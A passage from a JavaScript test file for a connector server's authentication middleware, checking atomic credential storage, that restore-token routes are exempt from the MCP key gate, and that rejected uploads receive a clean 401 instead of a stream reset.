      cs.setWordPressCredentials( { wp_url: `https://e${ i }.com`, wp_username: 'u', wp_password: `p${ i }` } );
    }

    const leftovers = readdirSync( dir ).filter( ( f ) => f.endsWith( '.tmp' ) );
    assert.deepEqual( leftovers, [], 'atomic writes must not leave temp files on the volume' );

    // The old implementation called writeFileSync on the live path, which
    // truncates in place; a crash mid-write lost every stored credential.
    assert.doesNotThrow( () => JSON.parse( readFileSync( cs.getStoragePaths().credFile, 'utf8' ) ) );

    rmSync( dir, { recursive: true, force: true } );
    if ( prevDir === undefined ) delete process.env.CONNECTOR_DATA_DIR; else process.env.CONNECTOR_DATA_DIR = prevDir;
    if ( prevKey === undefined ) delete process.env.CONNECTOR_SECRET_KEY; else process.env.CONNECTOR_SECRET_KEY = prevKey;
  } );
} );

// ---------------------------------------------------------------------------
// REGRESSION GUARD -- self-authenticated route coverage
//
// v12.31.0. The v12.28.0 auth gate (TNX-C-001) allowlisted only /tools and
// /tool-call as self-authenticated and missed the other twenty-one routes that
// verify X-Railway-Restore-Token internally, including every /restore-* target
// and all three /volume-* endpoints.
//
// The symptom was not a clean 401. The ts-client-gateway plugin streams an
// 11 MB tar.gz to POST /volume-restore; the gate rejected it as soon as the
// headers arrived, the server reset the HTTP/2 stream mid-upload, and cURL
// reported "error 92: stream was not closed cleanly: CANCEL" with no status
// code. Connector snapshot restore failed after every deployment with an error
// that pointed at the network rather than at authentication.
//
// A hand-maintained list is what broke. This test derives the truth from the
// source instead: it finds every handler that reads x-railway-restore-token and
// asserts each corresponding route is exempt from the MCP key.
// ---------------------------------------------------------------------------

describe( 'Auth gate: every self-authenticated route is exempt from the MCP key', () => {
  /**
   * Scan a source file for route registrations whose handler body reads the
   * restore token.
   *
   * @param {string} source File contents.
   * @returns {Array<{ method: string, path: string }>}
   */
  function findRestoreTokenRoutes( source ) {
    const lines  = source.split( '\n' );
    const routes = [];

    lines.forEach( ( line, index ) => {
      // Matches app.post("/x", ...) and router.post('/x', ...) alike.
      const m = /(?:app|router)\.(get|post|put|delete|all)\(\s*["']([^"']+)["']/.exec( line );
      if ( m ) routes.push( { line: index, method: m[ 1 ].toUpperCase(), path: m[ 2 ] } );
    } );

    const starts = routes.map( ( r ) => r.line );
    const found  = [];

    routes.forEach( ( route, i ) => {
      const end  = i + 1 < starts.length ? starts[ i + 1 ] : lines.length;
      const body = lines.slice( route.line, end ).join( '\n' );
      if ( body.includes( 'x-railway-restore-token' ) ) {
        found.push( { method: route.method, path: route.path } );
      }
    } );

    return found;
  }

  test( 'no route reading X-Railway-Restore-Token is blocked by the MCP gate', async () => {
    const { readFileSync, readdirSync, existsSync } = await import( 'node:fs' );
    const { join, dirname } = await import( 'node:path' );
    const { fileURLToPath } = await import( 'node:url' );
    const { isPublicPath, isSelfAuthenticatedPath } = await import( '../middleware/mcpAuth.js' );

    const srcRoot = join( dirname( fileURLToPath( import.meta.url ) ), '..' );

    /** @type {string[]} */
    const files = [ join( srcRoot, 'server-http.js' ) ];
    const routesDir = join( srcRoot, 'routes' );
    if ( existsSync( routesDir ) ) {
      for ( const f of readdirSync( routesDir ) ) {
        if ( f.endsWith( '.js' ) ) files.push( join( routesDir, f ) );
      }
    }

    /** @type {string[]} */
    const unreachable = [];

    for ( const file of files ) {
      for ( const route of findRestoreTokenRoutes( readFileSync( file, 'utf8' ) ) ) {
        // Parameterised paths never equal a literal request path, so probe with
        // the parameter segment replaced.
        const probe = route.path.includes( '/:' )
          ? `${ route.path.split( '/:' )[ 0 ] }/x`
          : route.path;

        if ( ! isPublicPath( probe ) && ! isSelfAuthenticatedPath( probe ) ) {
          unreachable.push( `${ route.method } ${ route.path }` );
        }
      }
    }

    assert.deepEqual( unreachable, [],
      'These routes authenticate with X-Railway-Restore-Token but are blocked by the ' +
      'MCP key gate, so the WordPress plugin cannot reach them:\n  ' +
      unreachable.join( '\n  ' ) );
  } );

  test( 'the snapshot restore endpoints the plugin depends on are reachable', async () => {
    // Named explicitly as well as derived, because these are the exact paths
    // the Connector Snapshots and Disaster Recovery pages post to. If a future
    // refactor removes them from the allowlist, the failure should name them.
    const { isSelfAuthenticatedPath } = await import( '../middleware/mcpAuth.js' );

    const required = [
      '/volume-restore', '/volume-snapshot', '/volume-snapshot/status',
      '/restore-skill', '/restore-books', '/restore-profiles', '/restore-modules',
      '/restore-personality', '/restore-dispatch-rules', '/restore-archive',
      '/restore-references', '/restore-scripts',
      '/brain-scan', '/brain-data', '/skill-export',
      '/ti-skill-compile', '/ti-skill-check-scope', '/set-modular-mode',
      '/tools', '/tool-call', '/provision',
    ];

    for ( const path of required ) {
      assert.equal( isSelfAuthenticatedPath( path ), true,
        `${ path } must be exempt from MCP_API_KEY; it verifies X-Railway-Restore-Token itself` );
    }
  } );

  test( 'an unauthenticated upload receives a readable 401, not a stream reset', async () => {
    // The gate must drain an inbound body before responding. Answering while
    // the client is still uploading resets the stream, and over HTTP/2 the
    // client then sees a transport error instead of the status code.
    const { mcpAuthMiddleware, assertConfigured } = await import( '../middleware/mcpAuth.js' );

    const prev = process.env.MCP_API_KEY;
    process.env.MCP_API_KEY = 'z'.repeat( 40 );
    assertConfigured();

    const { Readable } = await import( 'node:stream' );

    // A readable request stream standing in for a streaming upload.
    const req = Readable.from( [ Buffer.alloc( 1024, 1 ), Buffer.alloc( 1024, 2 ) ] );
    req.method  = 'POST';
    req.path    = '/mcp';
    req.headers = {};

    const res = { statusCode: null, body: null, headersSent: false };
    res.setHeader = () => {};
    res.status = ( c ) => { res.statusCode = c; return res; };
    res.json   = ( b ) => { res.body = b; res.headersSent = true; return res; };

    let nexted = false;
    mcpAuthMiddleware( req, res, () => { nexted = true; } );

    // Allow the drain to complete.
    await new Promise( ( r ) => setTimeout( r, 50 ) );

    assert.equal( nexted, false, 'the request must not reach the handler' );
    assert.equal( res.statusCode, 401, 'the caller must receive a status code, not a reset' );
    assert.equal( res.body.code, 'MCP_AUTH_REQUIRED' );

    if ( prev === undefined ) delete process.env.MCP_API_KEY;
    else process.env.MCP_API_KEY = prev;
  } );
} );
